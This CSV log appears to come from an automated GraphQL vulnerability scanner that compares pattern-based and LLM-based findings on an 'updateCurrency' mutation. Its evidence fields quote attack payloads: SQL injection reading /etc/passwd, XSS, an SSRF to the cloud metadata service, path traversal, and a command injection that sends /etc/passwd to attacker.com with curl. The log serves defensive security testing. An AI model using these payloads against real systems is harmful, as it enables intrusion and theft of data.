timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-08T20:33:06.852351,updateCurrency_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a SQL injection payload in the 'abbreviation' field: `UNION SELECT` coupled with `LOAD_FILE('/etc/passwd')` indicates an attempt to append and execute a database query to read the system's /etc/passwd file. The successful 200 status code suggests the payload was not properly sanitized and may have executed, exposing potential SQL injection vulnerability via GraphQL input parameters."", ""evidence"": ""' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- "", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL-- "", ""explanation"": ""The response contains a SQL injection payload in the 'abbreviation' field: `UNION SELECT` coupled with `LOAD_FILE('/etc/passwd')` indicates an attempt to append and execute a database query to read the system's /etc/passwd file. The successful 200 status code suggests the payload was not properly sanitized and may have executed, exposing potential SQL injection vulnerability via GraphQL input parameters.""}}]"
2025-10-08T20:33:19.348061,updateCurrency_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains an HTML payload (`<img src=x onerror=alert(1)>`) in the 'country' field, which demonstrates a classic stored XSS vector. If this value is rendered unsanitized in a browser, it would execute arbitrary JavaScript (alert(1)). The 200 status code confirms the payload was accepted and persisted, indicating a high likelihood of successful exploitation when retrieved and displayed to users."", ""evidence"": ""\""country\"": \""<img src=x onerror=alert(1)>\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""\""country\"": \""<img src=x onerror=alert(1)>\"""", ""explanation"": ""The response contains an HTML payload (`<img src=x onerror=alert(1)>`) in the 'country' field, which demonstrates a classic stored XSS vector. If this value is rendered unsanitized in a browser, it would execute arbitrary JavaScript (alert(1)). The 200 status code confirms the payload was accepted and persisted, indicating a high likelihood of successful exploitation when retrieved and displayed to users.""}}]"
2025-10-08T20:33:37.066028,updateCurrency_response_4,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]","[{""detection_name"": ""LLM: ssrf_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response includes the internal AWS metadata service URL (169.254.169.254) in the 'symbol' field. This IP address is a well-known target for SSRF attacks as it exposes cloud instance metadata, which often contains sensitive credentials. The presence of this URL suggests the server may have processed or stored an untrusted input that triggers internal network requests, a hallmark of SSRF vulnerabilities."", ""evidence"": ""http://169.254.169.254/latest/meta-data/ in 'symbol' field"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""ssrf_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""http://169.254.169.254/latest/meta-data/ in 'symbol' field"", ""explanation"": ""The response includes the internal AWS metadata service URL (169.254.169.254) in the 'symbol' field. This IP address is a well-known target for SSRF attacks as it exposes cloud instance metadata, which often contains sensitive credentials. The presence of this URL suggests the server may have processed or stored an untrusted input that triggers internal network requests, a hallmark of SSRF vulnerabilities.""}}]"
2025-10-08T20:33:51.809630,updateCurrency_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The 'abbreviation' field contains a payload with a command separator (;), a curl command to an external domain, and an attempt to exfiltrate /etc/passwd via command substitution and base64 encoding. This indicates an attempt to execute arbitrary OS commands via improper input sanitization in a GraphQL mutation, suggesting successful or attempted command injection."", ""evidence"": ""abbreviation: \""; curl https://attacker.com/?exfil=$(cat /etc/passwd)|base64 -\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""abbreviation: \""; curl https://attacker.com/?exfil=$(cat /etc/passwd)|base64 -\"""", ""explanation"": ""The 'abbreviation' field contains a payload with a command separator (;), a curl command to an external domain, and an attempt to exfiltrate /etc/passwd via command substitution and base64 encoding. This indicates an attempt to execute arbitrary OS commands via improper input sanitization in a GraphQL mutation, suggesting successful or attempted command injection.""}}]"
2025-10-08T20:34:08.369671,updateCurrency_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: path_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a directory traversal payload (../../../../../../etc/passwd) with a null byte (%00) in the 'country' field. This is a strong indicator of path injection attempting to access sensitive system files like /etc/passwd. The null byte suggests an attempt to bypass file path validation, a common technique in path traversal attacks. The successful 200 response indicates the server may have processed this malicious input without proper sanitization."", ""evidence"": ""country: \""../../../../../../etc/passwd%00\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""path_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""country: \""../../../../../../etc/passwd%00\"""", ""explanation"": ""The response contains a directory traversal payload (../../../../../../etc/passwd) with a null byte (%00) in the 'country' field. This is a strong indicator of path injection attempting to access sensitive system files like /etc/passwd. The null byte suggests an attempt to bypass file path validation, a common technique in path traversal attacks. The successful 200 response indicates the server may have processed this malicious input without proper sanitization.""}}]"
2025-10-08T20:34:43.183847,updateCurrency_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains unsanitized HTML tags (`<h1>` and `<iframe>`) in the `abbreviation` field. If this value is rendered directly in a client's browser without proper escaping, it would execute the embedded HTML/JavaScript, enabling HTML Injection and potential XSS attacks. The presence of raw HTML markup in the API response indicates insufficient input sanitization/output encoding."", ""evidence"": ""abbreviation: \""<h1>Hacked</h1><iframe src='javascript:alert(1)'>\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.9, ""evidence"": ""abbreviation: \""<h1>Hacked</h1><iframe src='javascript:alert(1)'>\"""", ""explanation"": ""The response contains unsanitized HTML tags (`<h1>` and `<iframe>`) in the `abbreviation` field. If this value is rendered directly in a client's browser without proper escaping, it would execute the embedded HTML/JavaScript, enabling HTML Injection and potential XSS attacks. The presence of raw HTML markup in the API response indicates insufficient input sanitization/output encoding.""}}]"
2025-10-08T20:35:16.902449,updateCurrency_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T20:35:33.216147,updateCurrency_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T20:35:54.593633,updateCurrency_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T20:36:10.644604,updateCurrency_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Unknown,1,0,0,0,1,0,0.0,llm_potential_only,,,Unknown,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""potential"", ""category"": ""Unknown"", ""description"": ""The server's error response explicitly suggests a valid field (getCurrency) when an invalid one (updateCurrency) is requested. This reveals schema structure through error messages, enabling attackers to discover valid fields via brute-force/typo attacks. While not critical, this information disclosure aids attackers in mapping the API surface."", ""evidence"": ""Error message contains \""Did you mean \\\""getCurrency\\\""?\"" suggestion"", ""confidence"": 0.8, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""MEDIUM"", ""confidence"": 0.8, ""evidence"": ""Error message contains \""Did you mean \\\""getCurrency\\\""?\"" suggestion"", ""explanation"": ""The server's error response explicitly suggests a valid field (getCurrency) when an invalid one (updateCurrency) is requested. This reveals schema structure through error messages, enabling attackers to discover valid fields via brute-force/typo attacks. While not critical, this information disclosure aids attackers in mapping the API surface.""}}]"
